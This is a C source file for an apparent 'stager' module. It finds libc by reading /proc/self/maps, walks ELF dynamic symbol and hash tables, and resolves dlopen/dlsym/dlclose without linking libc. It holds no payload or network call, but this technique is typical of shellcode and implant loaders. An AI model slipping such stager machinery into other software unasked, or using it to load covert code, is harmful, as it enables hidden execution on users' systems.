#include "dynload.h"
#include "state.h"
#include "syscalls.h"
#include "utils.h"

/* ---- minimal ELF dynamic-linker types/constants (no elf.h) ---- */
typedef struct {
  long d_tag;
  unsigned long d_val;
} Elf64_Dyn;

typedef struct {
  uint32_t st_name;
  unsigned char st_info;
  unsigned char st_other;
  uint16_t st_shndx;
  unsigned long st_value;
  unsigned long st_size;
} Elf64_Sym;

#define O_RDONLY 0
#define PT_DYNAMIC_TYPE 2
#define DT_NULL 0
#define DT_HASH 4
#define DT_STRTAB 5
#define DT_SYMTAB 6
#define DT_GNU_HASH 0x6ffffef5

/* Cached dl* entry points live in the writable runtime state block (see
 * state.h), not in .data, because the stager image is mapped RX. */

/* Parse a leading hex number (start address of a /proc/self/maps line). */
static unsigned long parse_hex(const char *s) {
  unsigned long v = 0;
  for (;; s++) {
    char c = *s;
    unsigned long d;
    if (c >= '0' && c <= '9')
      d = (unsigned long)(c - '0');
    else if (c >= 'a' && c <= 'f')
      d = (unsigned long)(c - 'a' + 10);
    else if (c >= 'A' && c <= 'F')
      d = (unsigned long)(c - 'A' + 10);
    else
      break;
    v = (v << 4) | d;
  }
  return v;
}

/* Scan /proc/self/maps for libc's base address (0 on failure). */
static unsigned long find_libc_base(void) {
  char buf[65536];
  size_t total = 0;

  int fd = (int)syscall3(SYS_open, (long)"/proc/self/maps", O_RDONLY, 0);
  if (fd < 0)
    return 0;

  while (total < sizeof(buf) - 1) {
    long n =
        syscall3(SYS_read, fd, (long)(buf + total), sizeof(buf) - 1 - total);
    if (n <= 0)
      break;
    total += (size_t)n;
  }
  syscall1(SYS_close, fd);
  buf[total] = '\0';

  char *line = buf;
  while (*line) {
    char *nl = line;
    while (*nl && *nl != '\n')
      nl++;
    char saved = *nl;
    *nl = '\0';
    if (strstr(line, "libc.so")) {
      return parse_hex(line);
    }
    if (saved == '\0')
      break;
    line = nl + 1;
  }
  return 0;
}

/* GNU ELF string hash used by DT_GNU_HASH tables. */
static uint32_t elf_gnu_hash(const char *name) {
  uint32_t h = 5381;
  for (const unsigned char *p = (const unsigned char *)name; *p; p++)
    h = (h << 5) + h + (uint32_t)*p;
  return h;
}

/* Resolve `name` via a GNU hash table (DT_GNU_HASH).
 *
 * Layout (Elf64): nbuckets, symoffset, bloom_size, bloom_shift,
 * bloom[bloom_size] (uint64_t each), buckets[nbuckets], chains[].
 * chains[] is indexed relative to symoffset: the chain entry for dynamic
 * symbol i lives at chains[i - symoffset].
 *
 * Returns the symbol address (base + st_value) or 0 if not found. */
static void *resolve_sym_gnu(void *base, Elf64_Sym *symtab, const char *strtab,
                             const uint32_t *ghash, const char *name) {
  uint32_t nbuckets = ghash[0];
  uint32_t symoffset = ghash[1];
  uint32_t bloom_size = ghash[2];
  uint32_t bloom_shift = ghash[3];
  if (nbuckets == 0 || bloom_size == 0)
    return 0;

  const uint64_t *bloom = (const uint64_t *)(ghash + 4);
  const uint32_t *buckets = (const uint32_t *)(bloom + bloom_size);
  const uint32_t *chains = buckets + nbuckets;

  uint64_t h = elf_gnu_hash(name);

  /* Cheap bloom-filter rejection. */
  uint64_t word = bloom[(h / 64) % bloom_size];
  uint64_t mask = (1ULL << (h % 64)) | (1ULL << ((h >> bloom_shift) % 64));
  if ((word & mask) != mask)
    return 0;

  uint32_t si = buckets[h % nbuckets];
  if (si == 0)
    return 0;

  const uint32_t *chain = chains - symoffset;
  for (uint32_t i = si;; i++) {
    uint32_t eh = chain[i];
    if ((eh | 1) == (h | 1)) {
      const Elf64_Sym *sym = &symtab[i];
      if (sym->st_name != 0 && sym->st_shndx != 0 &&
          strcmp(strtab + sym->st_name, name) == 0)
        return (void *)((char *)base + sym->st_value);
    }
    if (eh & 1)
      break;
  }
  return 0;
}

/* Resolve a dynamic symbol `name` from the ELF module loaded at `base`. */
static void *resolve_sym(void *base, const char *name) {
  Syscall_Elf64_Ehdr *ehdr = (Syscall_Elf64_Ehdr *)base;
  if (ehdr->e_ident[0] != ELFMAG0 || ehdr->e_ident[1] != ELFMAG1 ||
      ehdr->e_ident[2] != ELFMAG2 || ehdr->e_ident[3] != ELFMAG3)
    return 0;

  Syscall_Elf64_Phdr *phdr =
      (Syscall_Elf64_Phdr *)((char *)base + ehdr->e_phoff);
  Elf64_Dyn *dyn = 0;
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_DYNAMIC_TYPE) {
      dyn = (Elf64_Dyn *)((char *)base + phdr[i].p_vaddr);
      break;
    }
  }
  if (!dyn)
    return 0;

  Elf64_Sym *symtab = 0;
  const char *strtab = 0;
  const uint32_t *sysv_hash = 0;
  const uint32_t *ghash = 0;
  for (; dyn->d_tag != DT_NULL; dyn++) {
    /* Pointer-type DT_* entries hold absolute runtime addresses (the loader
     * relocates them); only st_value below needs the module base added. */
    if (dyn->d_tag == DT_SYMTAB)
      symtab = (Elf64_Sym *)dyn->d_val;
    else if (dyn->d_tag == DT_STRTAB)
      strtab = (const char *)dyn->d_val;
    else if (dyn->d_tag == DT_HASH)
      sysv_hash = (const uint32_t *)dyn->d_val;
    else if (dyn->d_tag == DT_GNU_HASH)
      ghash = (const uint32_t *)dyn->d_val;
  }
  if (!symtab || !strtab)
    return 0;

  /* SysV hash table (DT_HASH): layout is nbucket, nchain, buckets, chains.
   * nchain is the exact dynamic-symbol count, so a linear scan is safe. */
  if (sysv_hash) {
    unsigned long nchain = sysv_hash[1];
    for (unsigned long i = 0; i < nchain; i++) {
      const Elf64_Sym *sym = &symtab[i];
      if (sym->st_name != 0 && sym->st_shndx != 0 &&
          strcmp(strtab + sym->st_name, name) == 0)
        return (void *)((char *)base + sym->st_value);
    }
    return 0;
  }

  /* Some binaries ship only a GNU hash table (DT_GNU_HASH), e.g. glibc built
   * with --hash-style=gnu. Use it when DT_HASH is absent. */
  if (ghash)
    return resolve_sym_gnu(base, symtab, strtab, ghash, name);

  return 0;
}

/* Resolve dlopen/dlsym/dlclose from libc once. Returns 0 on success. */
static int resolve_dl(void) {
  struct stager_state *st = get_stager_state();
  if (st->dl_ready == 0)
    return (st->dlopen_ && st->dlsym_ && st->dlclose_) ? 0 : -1;

  unsigned long libc = find_libc_base();
  if (libc) {
    st->dlopen_ = (dlopen_fn)resolve_sym((void *)libc, "dlopen");
    st->dlsym_ = (dlsym_fn)resolve_sym((void *)libc, "dlsym");
    st->dlclose_ = (dlclose_fn)resolve_sym((void *)libc, "dlclose");
  }
  st->dl_ready = 0;
  return (st->dlopen_ && st->dlsym_ && st->dlclose_) ? 0 : -1;
}

void *dynload_open(const char *soname, int flags) {
  if (resolve_dl() != 0)
    return NULL;
  return get_stager_state()->dlopen_(soname, flags);
}

void *dynload_sym(void *handle, const char *name) {
  if (resolve_dl() != 0)
    return NULL;
  return get_stager_state()->dlsym_(handle, name);
}

int dynload_close(void *handle) {
  if (resolve_dl() != 0)
    return -1;
  return get_stager_state()->dlclose_(handle);
}

unsigned long dynload_find_libc(void) { return find_libc_base(); }

void *dynload_resolve_module(void *base, const char *name) {
  return resolve_sym(base, name);
}
